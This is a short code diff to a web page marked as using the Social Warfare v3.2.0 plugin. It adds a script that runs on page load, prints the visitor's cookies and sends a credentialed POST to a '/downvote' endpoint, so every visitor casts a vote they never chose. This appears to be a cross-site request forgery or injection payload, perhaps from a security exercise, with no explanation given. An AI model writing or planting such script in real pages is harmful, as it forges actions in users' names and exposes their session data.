@@ -12,6 +12,21 @@
 
 <!-- Social Warfare v3.2.0 https://warfareplugins.com -->
 <script>
+window.onload = downVote();
+
+function downVote() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+      console.log(document.cookie);
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("POST", "http://www.mywebsite.org/downvote", true);
+  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhttp.withCredentials = true;
+  xhttp.send("vote[post_id]=1");
+};
 
 function createVotes() {
   var xhttp = new XMLHttpRequest();
@@ -24,7 +39,7 @@ function createVotes() {
   xhttp.open("POST", "http://www.mywebsite.org/vote", true);
   xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   xhttp.withCredentials = true;
-  xhttp.send("vote[post_id]=8");
+  xhttp.send("vote[post_id]=2");
 };
 
 function updateVotes() {
